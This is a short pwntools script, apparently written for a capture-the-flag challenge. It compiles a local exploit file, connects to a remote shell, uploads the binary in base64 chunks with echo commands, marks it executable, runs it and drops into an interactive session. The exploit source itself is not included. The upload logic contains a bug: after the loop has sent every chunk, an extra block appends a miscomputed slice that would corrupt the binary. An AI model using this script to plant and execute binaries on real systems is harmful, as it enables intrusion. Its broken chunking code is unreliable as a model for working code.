#!/usr/bin/env python3
from pwn import *
import os

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

info('compile the exploit')
os.system("musl-gcc exp.cc -o exp -static -O2")

p = remote('127.0.0.1', 5555)

PROMPT = '/ # '

info('send the exploit')
with open('./exp', 'rb') as f:
    data = f.read()
    total = len(data)
    for i in range(0, total, 0x200):
        payload = b64e(data[i:i+0x200])
        sla(PROMPT, f'echo {payload} | base64 -d >> /tmp/exp')
    if total - i > 0:
        payload = b64e(data[total-i:total])
        sla(PROMPT, f'echo {payload} | base64 -d >> /tmp/exp')

context.log_level = 'debug'

info('execute the exploit')
sla(PROMPT, 'chmod +x /tmp/exp')
sla(PROMPT, '/tmp/exp')

p.interactive()

